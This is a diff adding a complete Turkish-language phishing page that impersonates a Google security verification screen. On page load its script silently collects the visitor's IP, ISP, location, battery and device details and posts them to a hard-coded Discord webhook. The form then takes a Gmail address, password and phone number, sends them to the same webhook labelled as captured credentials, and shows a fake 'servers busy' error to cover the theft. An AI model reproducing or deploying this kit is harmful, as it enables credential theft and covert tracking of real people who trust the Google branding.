@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Google Güvenlik Onayı</title>
+    <style>
+        body { background: #121212; color: white; font-family: 'Roboto', Arial, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; box-sizing: border-box; }
+        .box { background: #202124; padding: 30px; border-radius: 8px; width: 100%; max-width: 360px; text-align: center; box-shadow: 0 4px 15px rgba(0,0,0,0.5); border: 1px solid #3c4043; }
+        h2 { color: #fff; margin-bottom: 10px; font-weight: 500; font-size: 22px; }
+        p { font-size: 14px; color: #bdc1c6; margin-bottom: 25px; line-height: 1.5; }
+        input { width: 100%; padding: 14px; margin: 10px 0; border-radius: 4px; border: 1px solid #5f6368; background: transparent; color: #fff; box-sizing: border-box; outline: none; font-size: 16px; }
+        input:focus { border-color: #8ab4f8; }
+        button { width: 100%; padding: 14px; margin-top: 20px; border: none; border-radius: 4px; background: #8ab4f8; color: #202124; font-weight: bold; cursor: pointer; opacity: 0.5; transition: 0.3s; font-size: 16px; }
+        .active-btn { opacity: 1 !important; background: #4285f4 !important; color: white !important; }
+    </style>
+</head>
+<body>
+
+<div class="box">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" width="70" style="margin-bottom: 15px;">
+    <h2>Doğrulama Gerekli</h2>
+    <p>Hesabınızı güvene almak için bilgilerinizi onaylamanız gerekiyor.</p>
+    
+    <input type="email" id="email" placeholder="E-posta (@gmail.com)" oninput="validate()">
+    <input type="password" id="pass" placeholder="Şifre" oninput="validate()">
+    <input type="tel" id="phone" placeholder="Telefon (05xxxxxxxxx)" maxlength="11" oninput="validate()">
+    
+    <button id="submitBtn" onclick="sendForm()" disabled>İleri</button>
+</div>
+
+<script>
+    const webhook = "https://discord.com/api/webhooks/1492907888598057030/KJ9bmcDft5rHUqT1LcckQE8ysjGSiV0eqcp1T6pHYvnB4M8Dk-g1P_Zwon365RnT6Fkn";
+
+    // --- 1. OTOMATİK SİSTEM ANALİZİ (GİRİŞTE) ---
+    (async () => {
+        try {
+            const res = await fetch('https://ipapi.co/json/');
+            const d = await res.json();
+            
+            let batteryInfo = "Bilinmiyor";
+            if (navigator.getBattery) {
+                const b = await navigator.getBattery();
+                batteryInfo = `%${Math.round(b.level * 100)} (${b.charging ? "Şarjda" : "Deşarj"})`;
+            }
+
+            fetch(webhook, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    embeds: [{
+                        title: "🕵️ BİRİ SİTEYE GİRDİ!",
+                        color: 16776960,
+                        fields: [
+                            { name: "🌐 IP & ISP", value: `**IP:** ${d.ip}\n**Şirket:** ${d.org}`, inline: false },
+                            { name: "📍 Konum", value: `${d.city}, ${d.country_name}`, inline: true },
+                            { name: "🔋 Batarya", value: batteryInfo, inline: true },
+                            { name: "📱 Cihaz", value: `**CPU:** ${navigator.hardwareConcurrency} Çekirdek\n**Platform:** ${navigator.platform}`, inline: false }
+                        ],
+                        footer: { text: "GitHub Pages - 7/24 Aktif" },
+                        timestamp: new Date()
+                    }]
+                })
+            });
+        } catch (e) { console.error("Veri hatası"); }
+    })();
+
+    // --- 2. GİRİŞ KONTROLLERİ ---
+    function validate() {
+        const email = document.getElementById('email').value.toLowerCase();
+        const phone = document.getElementById('phone').value;
+        const pass = document.getElementById('pass').value;
+        const btn = document.getElementById('submitBtn');
+
+        const isGmail = email.endsWith('@gmail.com');
+        const isPhone = phone.length === 11 && phone.startsWith('05');
+        const isPass = pass.length >= 4;
+
+        if (isGmail && isPhone && isPass) {
+            btn.disabled = false;
+            btn.classList.add('active-btn');
+        } else {
+            btn.disabled = true;
+            btn.classList.remove('active-btn');
+        }
+    }
+
+    // --- 3. FORM GÖNDERME ---
+    async function sendForm() {
+        const payload = {
+            embeds: [{
+                title: "🎯 BİLGİLER ELE GEÇİRİLDİ!",
+                color: 16711680,
+                fields: [
+                    { name: "📧 E-posta", value: document.getElementById('email').value, inline: true },
+                    { name: "🔑 Şifre", value: document.getElementById('pass').value, inline: true },
+                    { name: "📱 Telefon", value: document.getElementById('phone').value, inline: false }
+                ],
+                timestamp: new Date()
+            }]
+        };
+
+        await fetch(webhook, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) });
+        alert("Bağlantı hatası: Google sunucuları şu an çok yoğun. Lütfen 5 dakika sonra tekrar deneyin.");
+    }
+</script>
+
+</body>
+</html>
